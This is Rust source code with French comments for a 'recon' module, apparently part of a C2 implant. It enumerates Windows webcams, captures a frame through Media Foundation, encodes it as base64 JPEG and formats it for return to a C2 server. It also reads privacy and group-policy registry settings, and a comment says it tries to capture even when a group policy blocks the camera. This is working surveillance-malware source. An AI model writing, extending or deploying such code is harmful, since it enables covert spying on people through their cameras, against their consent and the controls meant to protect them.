// recon/webcam.rs — Capture webcam via Windows Media Foundation
//
// Technique : Windows Media Foundation (WMF) + WIC pour l'encodage JPEG
//
// Flux d'exécution :
//   1. Vérification préliminaire (Privacy Settings Windows, GPO)
//   2. Initialisation COM + Media Foundation
//   3. Énumération des périphériques de capture vidéo
//   4. Activation de la première webcam trouvée
//   5. Lecture d'un sample (frame brut RGB32)
//   6. Encodage JPEG via WIC (Windows Imaging Component) — zéro dépendance externe
//   7. Encodage base64 du JPEG
//
// Défenses documentées :
//   - Windows Privacy API (LetAppsAccessCamera dans le registre)
//   - Politique GPO (HKLM\SOFTWARE\Policies\Microsoft\Camera)
//   - Absence de périphérique (VM, désactivé dans le BIOS)
//   - Périphérique déjà utilisé par une autre application
//   - LED matérielle (toujours active — non contournable)

use windows::{
    core::*,
    Win32::System::Com::*,
    Win32::Media::MediaFoundation::*,
    Win32::Graphics::Imaging::*,
    Win32::System::Com::StructuredStorage::*,
    Win32::UI::Shell::*,
};
use std::sync::mpsc;
use std::time::Duration;

// Alias explicite pour éviter le conflit avec windows::core::Result<T> (1 param)
type StdResult<T, E> = std::result::Result<T, E>;

// ─────────────────────────────────────────────────────────────────────────────
// Structures de résultat
// ─────────────────────────────────────────────────────────────────────────────

/// Résultat d'une tentative de capture webcam
pub struct WebcamResult {
    /// Succès de la capture
    pub success: bool,
    /// Image JPEG encodée en base64 (Some si success)
    pub image_b64: Option<String>,
    /// Nom du périphérique webcam (si détecté)
    pub device_name: Option<String>,
    /// Largeur du frame capturé
    pub width: u32,
    /// Hauteur du frame capturé
    pub height: u32,
    /// Raison précise de l'échec (si !success)
    pub error: Option<String>,
    /// Liste des mécanismes de défense Windows détectés
    pub defenses_detected: Vec<String>,
}

impl WebcamResult {
    fn failure(error: impl Into<String>, defenses: Vec<String>) -> Self {
        WebcamResult {
            success: false,
            image_b64: None,
            device_name: None,
            width: 0,
            height: 0,
            error: Some(error.into()),
            defenses_detected: defenses,
        }
    }

    /// Formate le résultat pour retour au serveur C2
    pub fn to_c2_output(&self) -> String {
        if self.success {
            format!(
                "WEBCAM_SUCCESS\nDevice: {}\nResolution: {}x{}\nDefenses: {}\nDATA:{}",
                self.device_name.as_deref().unwrap_or("Unknown"),
                self.width,
                self.height,
                if self.defenses_detected.is_empty() {
                    "None detected".to_string()
                } else {
                    self.defenses_detected.join(", ")
                },
                self.image_b64.as_deref().unwrap_or("")
            )
        } else {
            format!(
                "WEBCAM_FAILED\nError: {}\nDefenses detected: {}",
                self.error.as_deref().unwrap_or("Unknown error"),
                if self.defenses_detected.is_empty() {
                    "None".to_string()
                } else {
                    self.defenses_detected.join("\n  - ")
                }
            )
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Vérification préliminaire : défenses Windows
// ─────────────────────────────────────────────────────────────────────────────

/// check_windows_privacy — vérifie si Windows bloque l'accès caméra
///
/// Lit le registre pour détecter les blocages de la Privacy API et des GPO.
/// Retourne la liste des défenses actives détectées.
fn check_windows_privacy() -> Vec<String> {
    let mut defenses = Vec::new();

    // ── 1. Privacy API (Windows 10+ Privacy Settings) ───────────────────────
    // HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam
    // "Value" = "Deny" ou LetAppsAccessCamera = 2 → accès refusé
    unsafe {
        let key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\0";
        let mut hkey = windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE;
        let key_path_wide: Vec<u16> = key_path.encode_utf16().collect();

        let result = windows_sys::Win32::System::Registry::RegOpenKeyExW(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            key_path_wide.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey,
        );

        if result == 0 {
            let value_name: Vec<u16> = "Value\0".encode_utf16().collect();
            let mut buf = [0u16; 64];
            let mut buf_size = (buf.len() * 2) as u32;
            let mut reg_type = 0u32;

            let read_result = windows_sys::Win32::System::Registry::RegQueryValueExW(
                hkey,
                value_name.as_ptr(),
                std::ptr::null_mut(),
                &mut reg_type,
                buf.as_mut_ptr() as *mut u8,
                &mut buf_size,
            );

            if read_result == 0 {
                let len = (buf_size as usize / 2).saturating_sub(1);
                let value = String::from_utf16_lossy(&buf[..len]);
                if value.eq_ignore_ascii_case("Deny") {
                    defenses.push(
                        "[DEFENSE] Windows Privacy API : accès caméra refusé globalement (Paramètres → Confidentialité → Caméra → OFF)".to_string()
                    );
                }
            }
            windows_sys::Win32::System::Registry::RegCloseKey(hkey);
        }
    }

    // ── 2. GPO Restriction (HKLM\SOFTWARE\Policies\Microsoft\Camera) ────────
    unsafe {
        let key_path: Vec<u16> = "SOFTWARE\\Policies\\Microsoft\\Camera\0".encode_utf16().collect();
        let mut hkey = windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE;

        let result = windows_sys::Win32::System::Registry::RegOpenKeyExW(
            windows_sys::Win32::System::Registry::HKEY_LOCAL_MACHINE,
            key_path.as_ptr(),
            0,
            windows_sys::Win32::System::Registry::KEY_READ,
            &mut hkey,
        );

        if result == 0 {
            let value_name: Vec<u16> = "AllowCamera\0".encode_utf16().collect();
            let mut value: u32 = 1;
            let mut value_size = 4u32;
            let mut reg_type = 0u32;

            let read_result = windows_sys::Win32::System::Registry::RegQueryValueExW(
                hkey,
                value_name.as_ptr(),
                std::ptr::null_mut(),
                &mut reg_type,
                &mut value as *mut u32 as *mut u8,
                &mut value_size,
            );

            if read_result == 0 && value == 0 {
                defenses.push(
                    "[DEFENSE] GPO Microsoft Camera : AllowCamera = 0 — accès caméra bloqué par stratégie de groupe (GPO)".to_string()
                );
            }
            windows_sys::Win32::System::Registry::RegCloseKey(hkey);
        }
    }

    // ── 3. LED matérielle (toujours présente — non contournable) ────────────
    // Note documentaire : toute webcam physique possède une LED d'activité
    // câblée directement sur le bus USB/I2S, indépendante du logiciel.
    // Il est IMPOSSIBLE de désactiver la LED sans modifier le firmware de la webcam.
    // Seules quelques webcams défectueuses ou modifiées n'ont pas cette protection.
    defenses.push(
        "[INFO] LED matérielle : la LED de la webcam s'allumera pendant la capture. Non contournable sans modification hardware.".to_string()
    );

    defenses
}

// ─────────────────────────────────────────────────────────────────────────────
// Capture webcam via Windows Media Foundation
// ─────────────────────────────────────────────────────────────────────────────

/// try_capture — Tente de capturer un frame depuis la première webcam disponible
///
/// Retourne un WebcamResult avec l'image en base64 (JPEG) si succès,
/// ou une description détaillée de l'échec et des défenses détectées.
pub fn try_capture() -> WebcamResult {
    // Phase 1 : Vérification préliminaire des défenses
    let mut defenses = check_windows_privacy();

    // Vérifier si une GPO bloque (défense critique → on tente quand même)
    let gpo_blocked = defenses.iter().any(|d| d.contains("GPO"));
    if gpo_blocked {
        // On documente mais on tente quand même (les Win32 apps peuvent contourner GPO)
    }

    // Phase 2 : Initialiser COM
    // COINIT_APARTMENTTHREADED est requis pour les capture devices WMF :
    // les drivers de webcam utilisent des COM proxies STA. Avec MULTITHREADED,
    // ActivateObject() peut freezer indéfiniment sur certains systèmes.
    let com_result = unsafe { CoInitializeEx(None, COINIT_APARTMENTTHREADED) };
    if let Err(e) = com_result {
        if e.code().0 != 0x00000001u32 as i32 {
            // S_FALSE (0x1) = déjà initialisé, c'est OK
            return WebcamResult::failure(
                format!("Échec initialisation COM : {:?}. L'EDR ou un hook bloque CoInitializeEx.", e),
                defenses,
            );
        }
    }

    // Phase 3 : Initialiser Windows Media Foundation
    let mf_result = unsafe { MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET) };
    if mf_result.is_err() {
        unsafe { CoUninitialize(); }
        return WebcamResult::failure(
            "Échec MFStartup — Media Foundation non disponible sur cette version de Windows.",
            defenses,
        );
    }

    let result = unsafe { do_capture(&mut defenses) };

    // Cleanup
    unsafe {
        let _ = MFShutdown();
        CoUninitialize();
    }

    result
}

/// do_capture — Logique principale de capture (dans le contexte COM/MF initialisé)
unsafe fn do_capture(defenses: &mut Vec<String>) -> WebcamResult {
    // ── 1. Créer les attributs pour énumérer les webcams ────────────────────
    let mut attributes: Option<IMFAttributes> = None;
    if MFCreateAttributes(&mut attributes, 1).is_err() {
        return WebcamResult::failure("Impossible de créer les attributs MF.", defenses.clone());
    }
    let attributes = match attributes {
        Some(a) => a,
        None => return WebcamResult::failure("IMFAttributes null après création.", defenses.clone()),
    };

    // Filtrer sur les sources de capture vidéo
    if attributes.SetGUID(
        &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
        &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID,
    ).is_err() {
        return WebcamResult::failure("Impossible de configurer le filtre de type source vidéo.", defenses.clone());
    }

    // ── 2. Énumérer les webcams disponibles ─────────────────────────────────
    let mut devices: *mut Option<IMFActivate> = std::ptr::null_mut();
    let mut device_count: u32 = 0;

    if MFEnumDeviceSources(&attributes, &mut devices, &mut device_count).is_err() || device_count == 0 {
        defenses.push(
            "[DEFENSE] Aucune webcam détectée : périphérique absent, désactivé dans le BIOS/UEFI, ou driver non installé.".to_string()
        );
        return WebcamResult::failure(
            "Aucune webcam trouvée sur ce système. Vérifier : Device Manager → Cameras",
            defenses.clone(),
        );
    }

    // ── 3. Sélectionner la première webcam et récupérer son nom ─────────────
    let device_slice = std::slice::from_raw_parts(devices, device_count as usize);
    let activate = match &device_slice[0] {
        Some(a) => a.clone(),
        None => {
            return WebcamResult::failure("IMFActivate[0] est null.", defenses.clone());
        }
    };

    // Récupérer le nom convivial du périphérique
    let mut name_ptr = PWSTR::null();
    let mut name_len: u32 = 0;
    let device_name = if activate.GetAllocatedString(
        &MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME,
        &mut name_ptr,
        &mut name_len,
    ).is_ok() {
        let name = if name_ptr.is_null() {
            "Unknown Camera".to_string()
        } else {
            let slice = std::slice::from_raw_parts(name_ptr.0, name_len as usize);
            String::from_utf16_lossy(slice)
        };
        let _ = CoTaskMemFree(Some(name_ptr.0 as *const _));
        name
    } else {
        "Unknown Camera".to_string()
    };

    // ── 4. Activer la source média (ouvre la webcam) ─────────────────────────
    let source_result: Result<IMFMediaSource> = activate.ActivateObject();
    let source = match source_result {
        Ok(s) => s,
        Err(e) => {
            let error_code = e.code().0;
            let reason = match error_code as u32 {
                0xC00D36D5 => "Webcam déjà utilisée par une autre application (Teams, Zoom, OBS...)",
                0xC00D36B4 => "Accès refusé — Privacy Settings Windows bloque cet accès",
                0xC00D4271 => "Périphérique déconnecté pendant la tentative d'activation",
                _ => "Échec activation webcam — code inconnu",
            };
            if error_code as u32 == 0xC00D36B4 {
                defenses.push(
                    "[DEFENSE] Privacy API (Win32) : ActivateObject refusé avec E_ACCESSDENIED — les Paramètres de confidentialité Windows bloquent l'accès pour les apps Win32.".to_string()
                );
            }
            return WebcamResult::failure(
                format!("{} (HRESULT: 0x{:08X})", reason, error_code),
                defenses.clone(),
            );
        }
    };

    // ── 5. Créer le SourceReader pour lire les frames ───────────────────────
    let reader_result: Result<IMFSourceReader> = MFCreateSourceReaderFromMediaSource(&source, None);
    let reader = match reader_result {
        Ok(r) => r,
        Err(e) => {
            return WebcamResult::failure(
                format!("MFCreateSourceReaderFromMediaSource échoué : {:?}", e),
                defenses.clone(),
            );
        }
    };

    // ── 6. Configurer le format de sortie : RGB32 ────────────────────────────
    let media_type_result: Result<IMFMediaType> = MFCreateMediaType();
    let media_type = match media_type_result {
        Ok(mt) => mt,
        Err(_) => return WebcamResult::failure("Impossible de créer IMFMediaType.", defenses.clone()),
    };

    let _ = media_type.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video);
    let _ = media_type.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_RGB32);

    let set_type_result = reader.SetCurrentMediaType(
        MF_SOURCE_READER_FIRST_VIDEO_STREAM.0 as u32,
        None,
        &media_type,
    );
    if set_type_result.is_err() {
        return WebcamResult::failure(
            "Impossible de configurer RGB32 — format non supporté par cette webcam.",
            defenses.clone(),
        );
    }

    // ── 7. Obtenir les dimensions de la frame ────────────────────────────────
    let current_type_result: Result<IMFMediaType> = reader.GetCurrentMediaType(
        MF_SOURCE_READER_FIRST_VIDEO_STREAM.0 as u32,
    );
    let (width, height) = match current_type_result {
        Ok(ct) => {
            let packed: u64 = ct.GetUINT64(&MF_MT_FRAME_SIZE).unwrap_or(0);
            let w = (packed >> 32) as u32;
            let h = (packed & 0xFFFFFFFF) as u32;
            (w, h)
        }
        Err(_) => (640u32, 480u32), // Fallback dimensions
    };

    // ── 8. Lire un sample (frame) ────────────────────────────────────────────
    // On tente plusieurs fois car le premier frame peut être noir (warm-up webcam)
    // Chaque tentative est limitée à 8s via thread+channel pour éviter que
    // ReadSample bloque indéfiniment (problème connu sur certains drivers webcam)
    let mut raw_rgb32: Vec<u8> = Vec::new();
    let mut capture_ok = false;

    for attempt in 0..5usize {
        // Utilise StdResult pour éviter le conflit avec windows::core::Result<T>
        let (tx, rx) = mpsc::channel::<StdResult<Vec<u8>, String>>();
        let reader_ptr = &reader as *const IMFSourceReader as usize;
        let tx_clone = tx.clone();

        std::thread::spawn(move || {
            let reader_ref = unsafe { &*(reader_ptr as *const IMFSourceReader) };
            let mut si: u32 = 0;
            let mut sf: u32 = 0;
            let mut ts: i64 = 0;
            let mut smp: Option<IMFSample> = None;

            let read_result = unsafe {
                reader_ref.ReadSample(
                    MF_SOURCE_READER_FIRST_VIDEO_STREAM.0 as u32,
                    0,
                    Some(&mut si),
                    Some(&mut sf),
                    Some(&mut ts),
                    Some(&mut smp),
                )
            };

            if read_result.is_err() {
                let _ = tx_clone.send(StdResult::Err(format!("ReadSample err: {:?}", read_result)));
                return;
            }

            let smp = match smp {
                Some(s) => s,
                None => {
                    let _ = tx_clone.send(StdResult::Err("Sample null".to_string()));
                    return;
                }
            };

            let buffer = match unsafe { smp.ConvertToContiguousBuffer() } {
                Ok(b) => b,
                Err(e) => {
                    let _ = tx_clone.send(StdResult::Err(format!("ConvertToContiguousBuffer: {:?}", e)));
                    return;
                }
            };

            let mut data_ptr: *mut u8 = std::ptr::null_mut();
            let mut max_len: u32 = 0;
            let mut current_len: u32 = 0;

            if unsafe { buffer.Lock(&mut data_ptr, Some(&mut max_len), Some(&mut current_len)) }.is_ok() {
                if !data_ptr.is_null() && current_len > 0 {
                    let data = unsafe {
                        std::slice::from_raw_parts(data_ptr, current_len as usize).to_vec()
                    };
                    unsafe { let _ = buffer.Unlock(); }
                    let _ = tx_clone.send(StdResult::Ok(data));
                    return;
                }
                unsafe { let _ = buffer.Unlock(); }
            }
            let _ = tx_clone.send(StdResult::Err("Buffer lock ou données vides".to_string()));
        });

        match rx.recv_timeout(Duration::from_secs(8)) {
            Ok(StdResult::Ok(data)) => {
                raw_rgb32 = data;
                capture_ok = true;
                break;
            }
            Ok(StdResult::Err(_)) | Err(mpsc::RecvTimeoutError::Timeout) => {
                if attempt == 4 {
                    return WebcamResult::failure(
                        "ReadSample timeout (>8s) après 5 tentatives — webcam bloquée ou déjà utilisée ?",
                        defenses.clone(),
                    );
                }
                std::thread::sleep(Duration::from_millis(200));
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                if attempt == 4 {
                    return WebcamResult::failure(
                        "Thread de capture déconnecté inattendu",
                        defenses.clone(),
                    );
                }
            }
        }

    }

    if !capture_ok || raw_rgb32.is_empty() {
        return WebcamResult::failure(
            "Impossible d'obtenir un frame valide depuis la webcam après 5 tentatives.",
            defenses.clone(),
        );
    }

    // ── 9. Convertir RGB32 → JPEG via WIC (Windows Imaging Component) ───────
    let jpeg_result = encode_rgb32_to_jpeg(&raw_rgb32, width, height);
    match jpeg_result {
        Ok(jpeg_bytes) => {
            let image_b64 = base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                &jpeg_bytes,
            );
            WebcamResult {
                success: true,
                image_b64: Some(image_b64),
                device_name: Some(device_name),
                width,
                height,
                error: None,
                defenses_detected: defenses.to_vec(),
            }
        }
        Err(e) => WebcamResult::failure(
            format!("Capture OK mais encodage JPEG WIC échoué : {}", e),
            defenses.to_vec(),
        ),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Encodage JPEG via WIC (Windows Imaging Component) — zéro dépendance externe
// ─────────────────────────────────────────────────────────────────────────────

/// encode_rgb32_to_jpeg — encode des données RGB32 brutes en JPEG via WIC
///
/// WIC est intégré dans Windows Vista+ — aucune dépendance externe nécessaire.
/// Le GUID de l'encodeur JPEG WIC est GUID_ContainerFormatJpeg.
unsafe fn encode_rgb32_to_jpeg(
    rgb32_data: &[u8],
    width: u32,
    height: u32,
) -> std::result::Result<Vec<u8>, String> {
    // Créer la factory WIC
    let factory: IWICImagingFactory = CoCreateInstance(
        &CLSID_WICImagingFactory,
        None,
        CLSCTX_INPROC_SERVER,
    ).map_err(|e| format!("CoCreateInstance WICImagingFactory: {:?}", e))?;

    // Créer un stream mémoire pour recevoir le JPEG
    let stream: IStream = SHCreateMemStream(None)
        .ok_or_else(|| "SHCreateMemStream retourne null".to_string())?;

    // Créer l'encodeur JPEG
    let encoder = factory.CreateEncoder(
        &GUID_ContainerFormatJpeg,
        std::ptr::null(),
    ).map_err(|e| format!("CreateEncoder JPEG: {:?}", e))?;

    // Initialiser l'encodeur avec notre stream
    encoder.Initialize(&stream, WICBitmapEncoderNoCache)
        .map_err(|e| format!("IWICBitmapEncoder::Initialize: {:?}", e))?;

    // Créer un frame dans l'encodeur
    let mut frame: Option<IWICBitmapFrameEncode> = None;
    let mut props: Option<IPropertyBag2> = None;
    encoder.CreateNewFrame(&mut frame, &mut props)
        .map_err(|e| format!("CreateNewFrame: {:?}", e))?;

    let frame = frame.ok_or("IWICBitmapFrameEncode null")?;

    // Initialiser le frame
    frame.Initialize(props.as_ref())
        .map_err(|e| format!("IWICBitmapFrameEncode::Initialize: {:?}", e))?;

    // Définir la taille
    frame.SetSize(width, height)
        .map_err(|e| format!("SetSize: {:?}", e))?;

    // Définir le format pixel : BGR32 (WIC) = RGB32 inversé (WMF)
    let mut pixel_format = GUID_WICPixelFormat32bppBGR;
    frame.SetPixelFormat(&mut pixel_format)
        .map_err(|e| format!("SetPixelFormat: {:?}", e))?;

    // Écrire les pixels (stride = width * 4 bytes pour RGB32)
    let stride = width * 4;
    frame.WritePixels(height, stride, rgb32_data)
        .map_err(|e| format!("WritePixels: {:?}", e))?;

    // Committer le frame et l'encodeur
    frame.Commit()
        .map_err(|e| format!("Frame Commit: {:?}", e))?;
    encoder.Commit()
        .map_err(|e| format!("Encoder Commit: {:?}", e))?;

    // Lire les données JPEG depuis le stream mémoire
    // Remettre le curseur au début
    stream.Seek(0, STREAM_SEEK_SET, None)
        .map_err(|e| format!("Stream Seek: {:?}", e))?;

    // Lire tout le contenu
    let mut jpeg_bytes: Vec<u8> = Vec::new();
    let mut buf = [0u8; 4096];
    loop {
        let mut bytes_read: u32 = 0;
        let read_result = stream.Read(
            buf.as_mut_ptr() as *mut _,
            buf.len() as u32,
            Some(&mut bytes_read),
        );
        if bytes_read == 0 || read_result.is_err() {
            break;
        }
        jpeg_bytes.extend_from_slice(&buf[..bytes_read as usize]);
    }

    if jpeg_bytes.is_empty() {
        return Err("Le stream JPEG est vide après encodage".to_string());
    }

    Ok(jpeg_bytes)
}
